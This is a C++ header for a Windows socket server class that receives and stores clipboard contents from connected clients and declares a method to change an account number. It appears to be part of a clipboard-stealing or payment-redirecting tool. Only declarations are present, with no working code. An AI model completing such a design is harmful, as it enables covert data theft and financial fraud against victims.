#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include "Metadata.hh"
#include <vector>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include "SocketListener.h"
#include <iostream>
#include "WinapiHelpers.hh"
#include "ClientHandler.hh"
#include "IpAddress.hh"



#pragma comment(lib, "Ws2_32.lib")
class ClientHandler
{
public:
	explicit ClientHandler(SOCKET clientSocket);
	~ClientHandler();
	std::string RecvString(const Metadata& metadata);
	void RecvClipboardString(const Metadata& metadata);
	int SendMetadata(Metadata metadata);
	void Handle();
	void ChangeAccountNumberAsync(std::string accountNumber);
	Metadata RecvMetadata();

private:
	int Send(const char* data, int size);
	SOCKET clientSocket;
	std::vector<std::string> clipboardContentHistory;
	IpAddress ipAddress;
};

